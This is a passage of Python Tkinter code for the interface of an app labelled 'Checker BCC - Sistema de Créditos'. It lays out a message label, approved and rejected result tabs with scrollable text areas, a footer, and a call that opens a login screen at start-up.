mensaje_label = tk.Label(frame_principal, 
                        text="", 
                        font=custom_font,
                        fg=COLOR_PRIMARIO, 
                        bg=COLOR_FONDO)
mensaje_label.pack(pady=10)

# Notebook para resultados
style = ttk.Style()
style.theme_use('clam')
style.configure('TNotebook', background=COLOR_FONDO, borderwidth=0)
style.configure('TNotebook.Tab', 
               background=COLOR_FONDO, 
               foreground=COLOR_TEXTO,
               padding=[10, 5],
               font=custom_font_bold)
style.map('TNotebook.Tab', 
          background=[('selected', COLOR_SECUNDARIO)],
          foreground=[('selected', COLOR_FONDO)])

notebook = ttk.Notebook(frame_principal)
notebook.pack(fill='both', expand=True, pady=10)

# Pestaña de aprobadas
frame_aprovadas = tk.Frame(notebook, bg=COLOR_FONDO)
scroll_aprovadas = tk.Scrollbar(frame_aprovadas)
scroll_aprovadas.pack(side='right', fill='y')

mensaje_aprovada_text = tk.Text(frame_aprovadas, 
                               yscrollcommand=scroll_aprovadas.set,
                               bg=COLOR_ENTRY, 
                               fg=COLOR_TEXTO,
                               font=custom_font,
                               insertbackground=COLOR_TEXTO,
                               relief='flat',
                               padx=10,
                               pady=10)
mensaje_aprovada_text.pack(fill='both', expand=True)
scroll_aprovadas.config(command=mensaje_aprovada_text.yview)

notebook.add(frame_aprovadas, text="Aprobadas")

# Pestaña de rechazadas
frame_reprovadas = tk.Frame(notebook, bg=COLOR_FONDO)
scroll_reprovadas = tk.Scrollbar(frame_reprovadas)
scroll_reprovadas.pack(side='right', fill='y')

mensaje_reprovada_text = tk.Text(frame_reprovadas, 
                               yscrollcommand=scroll_reprovadas.set,
                               bg=COLOR_ENTRY, 
                               fg=COLOR_TEXTO,
                               font=custom_font,
                               insertbackground=COLOR_TEXTO,
                               relief='flat',
                               padx=10,
                               pady=10)
mensaje_reprovada_text.pack(fill='both', expand=True)
scroll_reprovadas.config(command=mensaje_reprovada_text.yview)

notebook.add(frame_reprovadas, text="Rechazadas")

# Footer
footer = tk.Label(frame_principal, 
                 text="© 2023 Checker BCC - Sistema de Créditos", 
                 font=custom_font,
                 fg=COLOR_TEXTO, 
                 bg=COLOR_FONDO)
footer.pack(side='bottom', pady=(20, 0))

# Mostrar login al iniciar
mostrar_login()

# Ejecutar la aplicación
root.mainloop()
